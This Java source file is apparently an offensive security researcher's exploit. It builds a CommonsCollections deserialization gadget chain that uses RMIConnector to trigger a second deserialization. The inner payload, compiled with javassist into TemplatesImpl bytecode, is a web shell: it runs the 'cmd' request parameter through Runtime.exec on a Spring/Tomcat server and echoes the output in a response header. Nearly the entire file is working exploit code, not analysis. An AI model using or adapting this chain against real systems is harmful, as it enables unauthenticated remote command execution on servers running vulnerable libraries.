package gadget.doubleunser;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.AbstractMapEntryDecorator;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import javax.naming.ConfigurationException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

//AnnotationInvocationHandler.readObject->AbstractInputCheckedMapDecorator.setValue->
// TransformedMap.checkSetValue->AbstractInputCheckedMapDecorator.setValue->
// TransformedMap.checkSetValue->InvokerTransformer.transform然后走rmi二次反序列化
public class CCtoRMI {
    public static void main(String[] args) throws Exception {
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        setFieldValue(jmxServiceURL, "urlPath", "/stub/"+CC3Exp());
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
        //寻找一条调用RMIConconnector的connect方法以触发二次反序列化

        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);


        HashMap<Object,Object> hash = new HashMap<Object,Object>();
        hash.put("value","value");
        Map<Object,Object> transmap1 = TransformedMap.decorate(hash,null,invokerTransformer);
        ConstantTransformer constantTransformer = new ConstantTransformer(rmiConnector);

        Map<Object,Object> transmap = TransformedMap.decorate(transmap1,null,constantTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler instance = (InvocationHandler) constructor.newInstance(Target.class,transmap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(instance);

        oos.close();
//        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
//        System.out.println(base64String);
//        System.out.println(base64String.length());



        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();

    }
    public static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }

    public static String CC3Exp() throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "aaaa");
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = payload();
        byte[][] codes = {code};
        bytecodesField.set(templates, codes);
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");
        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry, "bbb");
        lazyMap.remove("aaa");
        Class<LazyMap> c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, chainedTransformer);
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        new ObjectOutputStream(bao).writeObject(map2);
        return Base64.getEncoder().encodeToString(bao.toByteArray()).replaceAll("\\s*", "");
    }

    public static byte[] payload() throws NotFoundException, CannotCompileException, IOException {
        String s="public MyClassLoader(){             javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n" +
                "            java.lang.reflect.Field r=request.getClass().getDeclaredField(\"request\");\n" +
                "            r.setAccessible(true);" +
                "            org.apache.catalina.connector.Response response =((org.apache.catalina.connector.Request) r.get(request)).getResponse();\n"+
                "            String s =new Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()).next();" +
                "            response.setHeader(\"night\", s);}";
        ClassPool classPool = ClassPool.getDefault();
        classPool.importPackage(Scanner.class.getName());
        CtClass ctClass = classPool.get(AbstractTranslet.class.getName());


        CtClass calc = classPool.makeClass("MyClassLoader");
        calc.setSuperclass(ctClass);
        CtConstructor ctConstructor = CtNewConstructor.make(s, calc);
        calc.addConstructor(ctConstructor);

        return calc.toBytecode();
    }
}
